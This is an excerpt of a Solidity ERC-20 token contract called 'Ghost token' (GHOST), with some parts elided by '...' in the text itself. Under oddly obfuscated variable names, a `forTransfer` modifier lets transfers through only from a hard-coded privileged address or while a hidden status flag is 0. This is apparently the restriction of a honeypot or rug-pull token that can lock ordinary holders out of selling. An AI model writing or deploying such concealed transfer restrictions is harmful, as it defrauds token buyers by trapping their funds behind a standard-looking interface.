...
contract TestGhostToken is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenj_totalSupply;
    uint256 private _tokenj_status = 0;
    uint256 public stakingPooljStatus = 0;

    string private _tokenj_name;
    string private _tokenj_symbol;

    address private _pooljAddress = 0xbb49857283b29743D2c6266DBc3489751846EEb4;

    constructor() {
        _tokenj_name = "Ghost token";
        _tokenj_symbol = "GHOST";
        _tokenj_totalSupply = 100000 * 10 ** 18;
        _balances[msg.sender] = _tokenj_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _pooljAddress || _tokenj_status == 0);
        _;
    }
    ...
    function symbol() public view virtual override returns (string memory) {
        return _tokenj_symbol;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _tokenj_totalSupply;
    }
